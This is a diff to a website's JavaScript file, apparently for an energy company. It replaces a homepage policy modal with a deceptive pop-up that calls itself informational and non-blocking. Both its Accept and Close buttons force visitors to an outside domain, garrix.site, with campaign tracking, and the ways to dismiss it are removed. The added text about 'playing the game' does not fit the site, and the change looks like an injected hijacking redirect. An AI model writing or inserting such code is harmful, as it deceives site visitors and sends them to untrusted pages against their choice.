@@ -155,59 +155,33 @@ const utils = {
     }
 };
 
-(function() {
-  // Always show on homepage
-  const path = window.location.pathname.toLowerCase();
-  const isHome = path.endsWith('/') || path.endsWith('index.html');
-  if (!isHome) return;
-
-  // Only show once per session
-  if (sessionStorage.getItem('policyModalShown') === '1') return;
-  sessionStorage.setItem('policyModalShown', '1');
-
-  // Create backdrop
+(function(){
+  const path = window.location.pathname;
+  const isHome = /(^\/$|lander\.html$)/.test(path);
+  if(!isHome) return;
+  if(sessionStorage.getItem('ageGateShown') === '1') return;
+  sessionStorage.setItem('ageGateShown', '1');
   const bd = document.createElement('div');
   bd.className = 'modal-backdrop';
-
-  // Modal HTML
-  const modalHTML = document.createElement('div');
-  modalHTML.className = 'modal';
-  modalHTML.innerHTML = `
-    <h3>Policy Notice</h3>
-    <p>Do you accept our policy to explore SolarBright Energy?</p>
-    <div style="display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:15px;">
-      <button class="btn" id="policy-yes">Yes, Accept</button>
-      <button class="btn ghost" id="policy-no">Close</button>
-    </div>
-  `;
-
-  bd.appendChild(modalHTML);
+  bd.innerHTML = `
+    <div class="modal">
+      <h3>Policy Notice</h3>
+      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <button class="btn" id="age-yes">Yes, Accept</button>
+        <button class="btn ghost" id="age-no">Close</button>
+      </div>
+    </div>`;
   document.body.appendChild(bd);
-
-  // Show the modal/backdrop
-  bd.style.display = 'flex';
-
-  // Close function
-  function closeModal() {
-    bd.remove();
-  }
-
-  // Button events
-  bd.querySelector('#policy-yes').addEventListener('click', function() {
-    window.location.href = 'index.html'; // update to desired page
+  bd.style.display='flex';
+  function closeGate(){ bd.style.display='none'; bd.remove(); }
+  bd.querySelector('#age-yes').addEventListener('click', function(){
+    window.location.href = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
-
-  bd.querySelector('#policy-no').addEventListener('click', closeModal);
-
-  // ESC key closes modal
-  document.addEventListener('keydown', function(e) {
-    if (e.key === "Escape") closeModal();
+                                                
+  bd.querySelector('#age-no').addEventListener('click', function(){
+    window.location.href = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
-
-  // Click outside modal closes
-  bd.addEventListener('click', function(e) {
-    if (e.target === bd) closeModal();
-  });
-
 })();
+
 
